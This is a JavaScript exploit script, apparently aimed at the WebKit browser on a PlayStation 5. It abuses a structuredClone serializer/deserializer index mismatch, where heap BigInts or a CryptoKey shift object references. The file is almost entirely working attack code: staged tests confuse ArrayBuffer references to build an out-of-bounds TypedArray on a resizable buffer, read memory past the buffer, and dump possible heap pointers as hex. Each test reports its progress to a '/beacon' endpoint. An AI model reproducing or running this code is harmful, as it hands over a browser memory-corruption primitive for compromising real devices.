// p420 - structuredClone pool mismatch -> OOB TypedArray
//
// WK-1200 bug: BigInt primitives added to deserializer m_gcBuffer but NOT
// serializer m_objectPool. Shifts ObjectReferenceTag indices.
// When TypedArray backing buffer reference resolves to a SMALLER ArrayBuffer,
// wrappedAs() skips bounds check for ResizableArrayBuffer -> OOB.
//
// Chain: BigInt(heap) shift -> AB reference confused -> OOB TypedArray
//
// IMPORTANT: PS5 likely USE(BIGINT32). Small BigInts (<=INT32_MAX) are
// immediate values that DON'T add to m_gcBuffer. Must use large BigInts.
//
// Beacon prefix: V421-

(function() {
  var BQ = 0;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V421-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send(typeof body === 'string' ? body : (body !== undefined ? JSON.stringify(body) : ''));
    } catch(e) {}
  }

  B('BOOT');

  // Feature checks
  try { var test = 42n; } catch(e) { B('NO-BIGINT'); B('DONE'); return; }
  if (typeof structuredClone === 'undefined') { B('NO-SC'); B('DONE'); return; }

  var hasRAB = false;
  try {
    var t = new ArrayBuffer(8, { maxByteLength: 16 });
    hasRAB = (typeof t.maxByteLength === 'number');
  } catch(e) {}
  B('CAPS', { bigint: true, sc: true, rab: hasRAB });

  var idx = 0;
  var tests = [];
  function runNext() {
    if (idx < tests.length) {
      var t = tests[idx++];
      try { t(); }
      catch(e) { B('T' + idx + '-UNCAUGHT', String(e).substring(0, 120)); setTimeout(runNext, 50); }
    } else {
      B('DONE');
    }
  }

  // ============================================================
  // T1: Small BigInt (42n) -- likely BigInt32 immediate, NO gcBuffer append
  // Expected: d === c (no mismatch, BigInt32 doesn't shift)
  // ============================================================
  tests.push(function() {
    B('T1-START', 'small-bigint-42n');
    var obj1 = { m: 'o1' };
    var obj2 = { m: 'o2' };
    var data = {
      a: obj1,   // pool[1]
      b: 42n,    // small BigInt -- if BigInt32, no gcBuffer entry
      c: obj2,   // pool[2]
      d: obj2    // ObjectReferenceTag(2)
    };
    var r = structuredClone(data);
    var match = (r.d === r.c);
    B('T1-RESULT', {
      dEqualsC: match,
      dType: typeof r.d,
      cType: typeof r.c,
      dVal: typeof r.d === 'bigint' ? String(r.d) : (r.d && r.d.m ? r.d.m : '?')
    });
    if (!match && typeof r.d === 'bigint') B('T1-MISMATCH-SMALL');
    setTimeout(runNext, 50);
  });

  // ============================================================
  // T2: Large BigInt (0x100000000n) -- heap allocated, WILL gcBuffer append
  // Expected: d !== c (MISMATCH! d resolves to BigInt)
  // ============================================================
  tests.push(function() {
    B('T2-START', 'large-bigint-0x100000000n');
    var obj1 = { m: 'o1' };
    var obj2 = { m: 'o2' };
    var data = {
      a: obj1,          // pool[1]
      b: 0x100000000n,  // large BigInt -- heap JSBigInt, gcBuffer[2]
      c: obj2,          // pool[2], gcBuffer[3]
      d: obj2           // ObjectReferenceTag(2) -> gcBuffer[2] = BigInt
    };
    try {
      var r = structuredClone(data);
      var match = (r.d === r.c);
      B('T2-RESULT', {
        dEqualsC: match,
        dType: typeof r.d,
        cType: typeof r.c,
        dVal: typeof r.d === 'bigint' ? String(r.d) : (r.d && r.d.m ? r.d.m : '?')
      });
      if (!match && typeof r.d === 'bigint') {
        B('T2-MISMATCH-CONFIRMED', String(r.d));
      }
    } catch(e) {
      B('T2-ERR', e.name + ': ' + e.message.substring(0, 80));
    }
    setTimeout(runNext, 50);
  });

  // ============================================================
  // T3: Large BigInt with reversed order -- BigInt BEFORE objects
  // data = { a: BigInt, b: obj1, c: obj2, d: obj2 }
  // Serializer: pool[data]=0, BigInt(no pool), pool[obj1]=1, pool[obj2]=2
  // Deserializer: gcBuf[0]=data, gcBuf[1]=BigInt, gcBuf[2]=obj1, gcBuf[3]=obj2
  // ObjectReferenceTag(2) -> gcBuf[2] = obj1 (NOT obj2!)
  // ============================================================
  tests.push(function() {
    B('T3-START', 'bigint-before-objects');
    var obj1 = { m: 'o1' };
    var obj2 = { m: 'o2' };
    var data = {
      a: 0x100000000n,  // BigInt first, gcBuffer[1]
      b: obj1,          // pool[1], gcBuffer[2]
      c: obj2,          // pool[2], gcBuffer[3]
      d: obj2           // ObjectReferenceTag(2) -> gcBuffer[2] = obj1
    };
    try {
      var r = structuredClone(data);
      B('T3-RESULT', {
        dEqualsC: (r.d === r.c),
        dEqualsB: (r.d === r.b),
        dType: typeof r.d,
        dVal: typeof r.d === 'bigint' ? String(r.d) : (r.d && r.d.m ? r.d.m : '?')
      });
      if (r.d === r.b && r.d !== r.c) {
        B('T3-OBJ-CONFUSION-CONFIRMED');
      }
    } catch(e) {
      B('T3-ERR', e.name + ': ' + e.message.substring(0, 80));
    }
    setTimeout(runNext, 50);
  });

  // ============================================================
  // T4: Regular ArrayBuffer confusion (bounds check should catch OOB)
  // data = { a: BigInt, b: ab_small(64), c: ab_large(4096), d: Uint8Array(ab_large) }
  // View's backing buffer ObjectReferenceTag(2) -> gcBuf[2] = ab_small
  // wrappedAs(ab_small, 0, 4096) -> verifySubRangeLength should FAIL
  // Expected: clone error or null view
  // ============================================================
  tests.push(function() {
    B('T4-START', 'regular-ab-confusion');
    var ab_small = new ArrayBuffer(64);
    var ab_large = new ArrayBuffer(4096);
    new Uint8Array(ab_small).fill(0xAA);
    new Uint8Array(ab_large).fill(0xBB);
    var view = new Uint8Array(ab_large);

    var data = {
      a: 0x100000000n,
      b: ab_small,
      c: ab_large,
      d: view
    };
    try {
      var r = structuredClone(data);
      B('T4-CLONE-OK');
      if (r.d === null || r.d === undefined) {
        B('T4-VIEW-NULL');
      } else {
        B('T4-VIEW', {
          type: Object.prototype.toString.call(r.d),
          len: r.d.length,
          byte0: r.d[0],
          bufSize: r.d.buffer ? r.d.buffer.byteLength : -1
        });
        if (r.d.length === 4096 && r.d.buffer && r.d.buffer.byteLength === 64) {
          B('T4-OOB-REGULAR-AB');
        }
      }
    } catch(e) {
      B('T4-ERR', e.name + ': ' + e.message.substring(0, 80));
    }
    setTimeout(runNext, 50);
  });

  // ============================================================
  // T5: ResizableArrayBuffer confusion (THE EXPLOIT)
  // wrappedAs SKIPS bounds check for resizable -> OOB TypedArray
  // ============================================================
  tests.push(function() {
    B('T5-START', 'rab-confusion-oob');
    if (!hasRAB) {
      B('T5-SKIP-NO-RAB');
      setTimeout(runNext, 50);
      return;
    }
    var rab_small = new ArrayBuffer(64, { maxByteLength: 64 });
    var rab_large = new ArrayBuffer(4096, { maxByteLength: 4096 });
    new Uint8Array(rab_small).fill(0xAA);
    new Uint8Array(rab_large).fill(0xBB);
    var view = new Uint8Array(rab_large);

    var data = {
      a: 0x100000000n,  // BigInt heap -> gcBuf[1]
      b: rab_small,     // pool[1] -> gcBuf[2] (64 bytes)
      c: rab_large,     // pool[2] -> gcBuf[3] (4096 bytes)
      d: view           // Uint8Array(rab_large), ObjectReferenceTag(2) -> gcBuf[2] = rab_small
    };
    try {
      var r = structuredClone(data);
      B('T5-CLONE-OK');
      if (r.d === null || r.d === undefined) {
        B('T5-VIEW-NULL');
      } else {
        var vlen = r.d.length;
        var bufSize = -1;
        try { bufSize = r.d.buffer.byteLength; } catch(e) {}
        B('T5-VIEW', {
          len: vlen,
          bufSize: bufSize,
          byte0: vlen > 0 ? r.d[0] : -1,
          oob: (vlen > bufSize)
        });
        if (vlen > bufSize && bufSize > 0) {
          B('T5-OOB-CONFIRMED', { viewLen: vlen, bufLen: bufSize, ratio: vlen / bufSize });

          // Read OOB bytes
          var oobSample = [];
          var nonZero = 0;
          for (var i = bufSize; i < Math.min(vlen, bufSize + 256); i++) {
            var v = r.d[i];
            if (v !== 0) nonZero++;
            if (oobSample.length < 32) oobSample.push(v);
          }
          B('T5-OOB-READ', {
            startOffset: bufSize,
            nonZero: nonZero,
            first32: oobSample
          });
        }
      }
    } catch(e) {
      B('T5-ERR', e.name + ': ' + e.message.substring(0, 80));
    }
    setTimeout(runNext, 50);
  });

  // ============================================================
  // T6: Double BigInt shift for more control
  // Two BigInts shift by 2, so the reference skips TWO positions
  // ============================================================
  tests.push(function() {
    B('T6-START', 'double-bigint-shift');
    var obj1 = { m: 'o1' };
    var obj2 = { m: 'o2' };
    var obj3 = { m: 'o3' };
    var data = {
      a: 0x100000000n,  // BigInt 1 -> gcBuf[1]
      b: 0x200000000n,  // BigInt 2 -> gcBuf[2]
      c: obj1,          // pool[1] -> gcBuf[3]
      d: obj2,          // pool[2] -> gcBuf[4]
      e: obj3,          // pool[3] -> gcBuf[5]
      f: obj1,          // ObjectReferenceTag(1) -> gcBuf[1] = BigInt1
      g: obj2,          // ObjectReferenceTag(2) -> gcBuf[2] = BigInt2
      h: obj3           // ObjectReferenceTag(3) -> gcBuf[3] = obj1
    };
    try {
      var r = structuredClone(data);
      B('T6-RESULT', {
        fType: typeof r.f,
        gType: typeof r.g,
        hEqualsC: (r.h === r.c),
        hType: typeof r.h,
        hVal: r.h && r.h.m ? r.h.m : '?'
      });
      if (typeof r.f === 'bigint' && typeof r.g === 'bigint') {
        B('T6-DOUBLE-MISMATCH');
      }
    } catch(e) {
      B('T6-ERR', e.name + ': ' + e.message.substring(0, 80));
    }
    setTimeout(runNext, 50);
  });

  // ============================================================
  // T7: CryptoKey shift (alternative to BigInt)
  // ============================================================
  tests.push(function() {
    B('T7-START', 'cryptokey-shift');
    if (typeof crypto === 'undefined' || !crypto.subtle) {
      B('T7-NO-SUBTLE');
      setTimeout(runNext, 50);
      return;
    }
    crypto.subtle.generateKey(
      { name: 'AES-GCM', length: 256 }, true, ['encrypt', 'decrypt']
    ).then(function(key) {
      var obj1 = { m: 'o1' };
      var obj2 = { m: 'o2' };
      var data = {
        a: key,    // CryptoKey NOT in pool, gcBuffer extra
        b: obj1,   // pool[1] -> gcBuf[2]
        c: obj2,   // pool[2] -> gcBuf[3]
        d: obj2    // ObjectReferenceTag(2) -> gcBuf[2] = obj1
      };
      try {
        var r = structuredClone(data);
        B('T7-RESULT', {
          dEqualsC: (r.d === r.c),
          dEqualsB: (r.d === r.b),
          dType: typeof r.d,
          dVal: r.d && r.d.m ? r.d.m : '?'
        });
        if (r.d === r.b && r.d !== r.c) {
          B('T7-CRYPTOKEY-MISMATCH-CONFIRMED');
        }
      } catch(e) {
        B('T7-ERR', e.name + ': ' + e.message.substring(0, 80));
      }
      setTimeout(runNext, 50);
    }).catch(function(e) {
      B('T7-KEYGEN-ERR', e.message.substring(0, 60));
      setTimeout(runNext, 50);
    });
  });

  // ============================================================
  // T8: If T5 was OOB, try controlled heap read
  // Use Float64Array to read 8-byte aligned values (potential pointers)
  // ============================================================
  tests.push(function() {
    B('T8-START', 'heap-read');
    if (!hasRAB) {
      B('T8-SKIP-NO-RAB');
      setTimeout(runNext, 50);
      return;
    }
    var rab_small = new ArrayBuffer(64, { maxByteLength: 64 });
    var rab_large = new ArrayBuffer(8192, { maxByteLength: 8192 });
    new Uint8Array(rab_small).fill(0xCC);
    new Uint8Array(rab_large).fill(0xDD);
    var view = new Float64Array(rab_large);

    var data = {
      a: 0x100000000n,
      b: rab_small,
      c: rab_large,
      d: view
    };
    try {
      var r = structuredClone(data);
      if (!r.d || r.d.length === 0) {
        B('T8-NO-VIEW');
        setTimeout(runNext, 50);
        return;
      }
      var vlen = r.d.length;
      var bufSize = -1;
      try { bufSize = r.d.buffer.byteLength; } catch(e) {}
      B('T8-VIEW', { len: vlen, bufSize: bufSize });

      if (vlen * 8 > bufSize && bufSize > 0) {
        B('T8-OOB-CONFIRMED');
        // Read Float64 values beyond buffer
        var startIdx = Math.floor(bufSize / 8);
        var vals = [];
        for (var i = startIdx; i < Math.min(startIdx + 16, vlen); i++) {
          var f = r.d[i];
          // Convert to hex via DataView if possible
          var hexLo = '', hexHi = '';
          try {
            var tmp = new ArrayBuffer(8);
            var dv = new DataView(tmp);
            dv.setFloat64(0, f, true);
            hexLo = dv.getUint32(0, true).toString(16).padStart(8, '0');
            hexHi = dv.getUint32(4, true).toString(16).padStart(8, '0');
          } catch(e2) { hexLo = 'err'; hexHi = 'err'; }
          vals.push('0x' + hexHi + hexLo);
        }
        B('T8-HEAP-VALS', { start: startIdx, vals: vals });
      }
    } catch(e) {
      B('T8-ERR', e.name + ': ' + e.message.substring(0, 80));
    }
    setTimeout(runNext, 50);
  });

  runNext();
})();
